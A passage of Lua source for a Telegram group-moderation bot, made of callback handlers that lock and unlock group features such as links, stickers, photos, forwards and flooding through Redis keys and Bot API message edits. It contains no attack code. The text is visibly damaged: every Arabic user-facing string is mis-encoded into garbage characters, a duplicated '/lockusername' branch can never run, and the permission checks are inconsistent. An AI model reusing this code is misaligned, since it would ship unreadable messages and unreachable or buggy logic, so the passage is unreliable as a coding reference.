if Text and Text:match('(.*)/lockjoine') and Admin(data) then
if tonumber(Text:match('(.*)/lockjoine')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ '
database:set(bot_id.."Lock:AddMempar"..Chat_id,"kick") 
database:set(bot_id.."Lock:AddMempar"..tthh,"kick") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockchat') and OwnerSs(mahh) then
if tonumber(Text:match('(.*)/lockchat')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω '
database:set(bot_id.."Lock:text"..Chat_id,true) 
database:set(bot_id.."Lock:text"..tthh,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lock_joine') and Admin(data) then
if tonumber(Text:match('(.*)/lock_joine')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ '
database:set(bot_id.."Lock:Join"..Chat_id,"kick") 
database:set(bot_id.."Lock:Join"..tthh,"kick") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockbots') and Admin(data) then
if tonumber(Text:match('(.*)/lockbots')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ '
database:set(bot_id.."Lock:Bot:kick"..Chat_id,"del") 
database:set(bot_id.."Lock:Bot:kick"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/locktags') and Admin(data) then
if tonumber(Text:match('(.*)/locktags')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ '
database:set(bot_id.."Lock:tagservr"..Chat_id,true) 
database:set(bot_id.."Lock:tagservr"..tthh,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockedit') and OwnerSs(mahh) then
if tonumber(Text:match('(.*)/lockedit')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ '
database:set(bot_id.."Lock:edit"..Chat_id,true) 
database:set(bot_id.."Lock:edit"..tthh,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/locklink') and Admin(data) then
if tonumber(Text:match('(.*)/locklink')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· '
database:set(bot_id.."Lock:Link"..Chat_id,"del") 
database:set(bot_id.."Lock:Link"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockusername') and Admin(data) then
if tonumber(Text:match('(.*)/lockusername')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ '
database:set(bot_id.."Lock:User:Name"..Chat_id,"del") 
database:set(bot_id.."Lock:User:Name"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockusername') and Admin(data) then
if tonumber(Text:match('(.*)/lockusername')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΨ§Ω '
database:set(bot_id.."Lock:hashtak"..Chat_id,"del") 
database:set(bot_id.."Lock:hashtak"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/locksticar') and Admin(data) then
if tonumber(Text:match('(.*)/locksticar')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ '
database:set(bot_id.."Lock:Sticker"..Chat_id,"del") 
database:set(bot_id.."Lock:Sticker"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockgif') and Admin(data) then
if tonumber(Text:match('(.*)/lockgif')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ '
database:set(bot_id.."Lock:Animation"..Chat_id,"del") 
database:set(bot_id.."Lock:Animation"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockvideo') and Admin(data) then
if tonumber(Text:match('(.*)/lockvideo')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ '
database:set(bot_id.."Lock:Video"..Chat_id,"del") 
database:set(bot_id.."Lock:Video"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockphoto') and Admin(data) then
if tonumber(Text:match('(.*)/lockphoto')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ΅ΩΨ± '
database:set(bot_id.."Lock:Photo"..Chat_id,"del") 
database:set(bot_id.."Lock:Photo"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockvoise') and Admin(data) then
if tonumber(Text:match('(.*)/lockvoise')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ '
database:set(bot_id.."Lock:Audio"..Chat_id,"del") 
database:set(bot_id.."Lock:Audio"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockaudo') and Admin(data) then
if tonumber(Text:match('(.*)/lockaudo')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ΅ΩΨͺ '
database:set(bot_id.."Lock:vico"..Chat_id,"del") 
database:set(bot_id.."Lock:vico"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockfwd') and Admin(data) then
if tonumber(Text:match('(.*)/lockfwd')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ '
database:set(bot_id.."Lock:forward"..Chat_id,'del') 
database:set(bot_id.."Lock:forward"..tthh,'del') 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockfile') and Admin(data) then
if tonumber(Text:match('(.*)/lockfile')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ '
database:set(bot_id.."Lock:Document"..Chat_id,"del") 
database:set(bot_id.."Lock:Document"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockphone') and Admin(data) then
if tonumber(Text:match('(.*)/lockphone')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ '
database:set(bot_id.."Lock:Contact"..Chat_id,"del") 
database:set(bot_id.."Lock:Contact"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockposts') and Admin(data) then
if tonumber(Text:match('(.*)/lockposts')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄ '
database:set(bot_id.."Lock:Spam"..Chat_id,"del") 
database:set(bot_id.."Lock:Spam"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockflood') and Admin(data) then
if tonumber(Text:match('(.*)/lockflood')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± '
database:hset(bot_id.."flooding:settings:"..Chat_id ,"flood","del") 
database:hset(bot_id.."flooding:settings:"..tthh ,"flood","del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockfarse') and Admin(data) then
if tonumber(Text:match('(.*)/lockfarse')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ '
database:set(bot_id..'lock:Fars'..Chat_id,true) 
database:set(bot_id..'lock:Fars'..tthh,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockfshar') and Admin(data) then
if tonumber(Text:match('(.*)/lockfshar')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ³Ψ¨ '
database:set(bot_id..'lock:Fshar'..Chat_id,true) 
database:set(bot_id..'lock:Fshar'..tthh,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/lockinlene') and Admin(data) then
if tonumber(Text:match('(.*)/lockinlene')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ '
database:set(bot_id.."Lock:Inlen"..Chat_id,"del") 
database:set(bot_id.."Lock:Inlen"..tthh,"del") 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/unlockjoine') and Admin(data) then
if tonumber(Text:match('(.*)/unlockjoine')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ '
database:del(bot_id.."Lock:AddMempar"..Chat_id) 
database:del(bot_id.."Lock:AddMempar"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockchat') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockchat')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω '
database:del(bot_id.."Lock:text"..Chat_id) 
database:del(bot_id.."Lock:text"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlock_joine') and Admin(data) then
if tonumber(Text:match('(.*)/unlock_joine')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ '
database:del(bot_id.."Lock:Join"..Chat_id) 
database:del(bot_id.."Lock:Join"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockbots') and Admin(data) then
if tonumber(Text:match('(.*)/unlockbots')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ '
database:del(bot_id.."Lock:Bot:kick"..Chat_id) 
database:del(bot_id.."Lock:Bot:kick"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlocktags') and Admin(data) then
if tonumber(Text:match('(.*)/unlocktags')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ '
database:del(bot_id.."Lock:tagservr"..Chat_id) 
database:del(bot_id.."Lock:tagservr"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockedit') and OwnerSs(data) then
if tonumber(Text:match('(.*)/unlockedit')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ '
database:del(bot_id.."Lock:edit"..Chat_id) 
database:del(bot_id.."Lock:edit"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlocklink') and Admin(data) then
if tonumber(Text:match('(.*)/unlocklink')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· '
database:del(bot_id.."Lock:Link"..Chat_id) 
database:del(bot_id.."Lock:Link"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockusername') and Admin(data) then
if tonumber(Text:match('(.*)/unlockusername')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ '
database:del(bot_id.."Lock:User:Name"..Chat_id) 
database:del(bot_id.."Lock:User:Name"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlocktag') and Admin(data) then
if tonumber(Text:match('(.*)/unlocktag')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω '
database:del(bot_id.."Lock:hashtak"..Chat_id) 
database:del(bot_id.."Lock:hashtak"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlocksticar') and Admin(data) then
if tonumber(Text:match('(.*)/unlocksticar')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ '
database:del(bot_id.."Lock:Sticker"..Chat_id) 
database:del(bot_id.."Lock:Sticker"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockgif') and Admin(data) then
if tonumber(Text:match('(.*)/unlockgif')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ '
database:del(bot_id.."Lock:Animation"..Chat_id) 
database:del(bot_id.."Lock:Animation"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockvideo') and Admin(data) then
if tonumber(Text:match('(.*)/unlockvideo')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ '
database:del(bot_id.."Lock:Video"..Chat_id) 
database:del(bot_id.."Lock:Video"..tthh) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/unlockphoto') and Admin(data) then
if tonumber(Text:match('(.*)/unlockphoto')) == tonumber(data.sender_user_id_) then
local Textedit = 'β’ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ± '
database:del(bot_id.."Lock:Photo"..Chat_id) 
database:del(bot_id.."Lock:Photo"..tthh) 
keyboard = {} 
